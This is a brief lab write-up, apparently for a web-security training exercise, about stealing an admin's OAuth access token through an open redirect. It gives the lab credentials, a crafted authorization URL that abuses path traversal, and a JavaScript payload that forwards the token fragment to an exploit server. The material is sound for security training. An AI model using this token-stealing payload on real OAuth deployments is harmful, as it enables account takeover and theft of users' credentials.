Lab #5 – Stealing OAuth access tokens via an open redirect

Vulnerable functionality - OAuth implementation.

Goal - Exploit an open redirect and steal the admin's access token.

creds - wiener:peter

Analysis:

https://oauth-0a38006904e8856e80291fc6022d005d.oauth-server.net/auth?client_id=vhsektvuyrxdeolacqsgc&redirect_uri=https://0a78008d04e685ac8004210c009200c2.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac400b304f1853f805f2099014a00c5.exploit-server.net/exploit&response_type=token&nonce=-2115719464&scope=openid%20profile%20email


<script>
if (!document.location.hash){
    window.location = 'https://oauth-0a38006904e8856e80291fc6022d005d.oauth-server.net/auth?client_id=vhsektvuyrxdeolacqsgc&redirect_uri=https://0a78008d04e685ac8004210c009200c2.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac400b304f1853f805f2099014a00c5.exploit-server.net/exploit&response_type=token&nonce=-2115719464&scope=openid%20profile%20email'

} else {
    window.location = '/?' + window.location.hash.substr(1)

}
</script>